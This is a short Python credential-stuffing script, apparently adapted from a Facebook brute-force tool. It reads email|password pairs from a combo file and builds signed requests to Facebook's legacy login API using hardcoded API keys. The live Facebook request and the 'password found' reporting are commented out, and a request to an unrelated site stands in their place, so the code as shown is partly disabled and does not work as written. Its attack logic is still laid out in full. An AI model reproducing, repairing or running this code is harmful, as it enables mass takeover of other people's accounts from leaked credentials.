#!/usr/bin/python3
#part of this code  from DedSecTl FBBrute
import os, sys, urllib, hashlib
from urllib.request import urlopen

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

print("Facebook Login Test\n")
try:
	for theguy in open("clean_combo.fb",'r').readlines():
		usermail=theguy[0:theguy.index('|')]
		passw=theguy[theguy.index('|')+1: 99]; passw=passw.strip()
		sys.stdout.write("[Trying ==>] "+usermail+" [PWD] "+passw+"\n")
		sys.stdout.flush()
		sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+usermail+"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+passw+"return_ssl_resources=0&v=1.0&sig="+API_SECRET
		xx = hashlib.md5(sig.encode('UTF-8')).hexdigest()
		data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(usermail,passw,xx)
#		response = urllib.request.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
		response = urllib.request.urlopen("http://motopaedia.com")
		print(response)
		if "error" in response:
			pass
		else:
			#print("\n\n[+] Password found .. !!")
			#print("\n[+] Password : {}".format(theguy.strip()))
			#break
			pass
	print("\n\n[!] Done .. !!")
except KeyboardInterrupt:
	print("test-login-fb: error: Keyboard interrupt")
